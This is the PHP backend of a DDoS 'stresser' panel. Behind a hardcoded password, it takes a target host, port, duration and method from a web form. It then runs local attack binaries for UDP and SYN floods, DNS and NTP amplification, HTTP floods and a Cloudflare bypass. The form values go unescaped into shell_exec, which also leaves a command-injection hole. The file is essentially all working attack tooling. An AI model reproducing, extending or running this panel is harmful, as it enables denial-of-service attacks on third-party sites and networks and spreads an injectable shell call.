<?php
// Coded by Sword

$key = $_POST['key'];
$host = $_POST['host'];
$port = $_POST['port'];
$time = $_POST['time'];
$method = $_POST['methods'];

if ($key == "mdp") {
    if ($method == "UDP") {
        shell_exec("cd /home/kali/script/ && ./udp $host $port $time");
        echo "Attack sent on $host with the port $port for $time s with $method method.";
        header('Refresh: 3; ./panel.html');
    }
    if ($method == "SYN") { 
        shell_exec("cd /home/kali/script/ && ./syn $host $port $time");
        echo "Attack sent on $host with the port $port for $time s with $method method.";
        header('Refresh: 3; ./panel.html');
    }
    if ($method == "AMP-DNS") { 
        shell_exec("cd /home/kali/script/ && ./amp-dns $host dns.txt $port $time");
        echo "Attack sent on $host with the port $port for $time s with $method method.";
        header('Refresh: 3; ./panel.html');
    }
    if ($method == "AMP-NTP") { 
        shell_exec("cd /home/kali/script/ && ./amp-ntp $host ntp.txt $port $time");
        echo "Attack sent on $host with the port $port for $time s with $method method.";
        header('Refresh: 3; ./panel.html');
    }
    if ($method == "HTTP") { 
        shell_exec("cd /home/kali/script/ && ./http $host $port $time");
        echo "Attack sent on $host with the port $port for $time s with $method method.";
        header('Refresh: 3; ./panel.html');
    }
    if ($method == "CF-BYPASS") { 
        shell_exec("cd /home/kali/script/ && ./cf-bypass $host proxy.txt $port $time");
        echo "Attack sent on $host with the port $port for $time s with $method method.";
        header('Refresh: 3; ./panel.html');
    }
}
else { 
    echo "Key invalid !";
}


?>
